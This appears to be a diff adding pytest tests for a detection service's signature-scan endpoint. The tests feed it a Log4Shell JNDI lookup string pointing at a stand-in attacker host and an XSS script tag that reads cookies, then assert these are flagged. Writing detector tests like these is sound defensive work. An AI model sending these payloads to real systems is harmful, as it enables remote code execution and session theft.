@@ -237,3 +237,64 @@ async def test_usb_trust(client):
     response = await client.post("/usb/trust?device_id=05ac:1234")
     assert response.status_code == 200
     assert response.json()["trusted"] is True
+
+
+# ── Phase 5b tests ────────────────────────────────────────────────────────────
+
+@pytest.mark.asyncio
+async def test_signatures_info(client):
+    """Signature library should report a healthy count and categories."""
+    response = await client.get("/signatures/info")
+    assert response.status_code == 200
+    data = response.json()
+    assert "signature_count" in data
+    assert data["signature_count"] > 50
+    assert "categories" in data
+    assert isinstance(data["categories"], list)
+    assert len(data["categories"]) > 3
+
+
+@pytest.mark.asyncio
+async def test_signatures_scan_sql_injection(client):
+    """Log4Shell payload should be detected as critical RCE."""
+    response = await client.post("/signatures/scan", json={
+        "payload": "${jndi:ldap://evil.example.com/exploit}"
+    })
+    assert response.status_code == 200
+    data = response.json()
+    assert data["match_count"] > 0
+    assert data["highest_severity"] == "critical"
+    assert "remote_code_execution" in data["attack_types"]
+
+
+@pytest.mark.asyncio
+async def test_signatures_scan_xss(client):
+    """XSS script tag should be detected."""
+    response = await client.post("/signatures/scan", json={
+        "text": "<script>alert(document.cookie)</script>"
+    })
+    assert response.status_code == 200
+    data = response.json()
+    assert data["match_count"] > 0
+    assert data["highest_severity"] in ("high", "critical")
+
+
+@pytest.mark.asyncio
+async def test_signatures_scan_clean(client):
+    """A clean payload should produce zero matches."""
+    response = await client.post("/signatures/scan", json={
+        "text": "Hello world! This is a normal sentence with no attacks."
+    })
+    assert response.status_code == 200
+    data = response.json()
+    assert data["match_count"] == 0
+    assert data["highest_severity"] is None
+
+
+@pytest.mark.asyncio
+async def test_signatures_scan_empty(client):
+    """Empty scan request should return zero matches, not an error."""
+    response = await client.post("/signatures/scan", json={})
+    assert response.status_code == 200
+    data = response.json()
+    assert data["match_count"] == 0
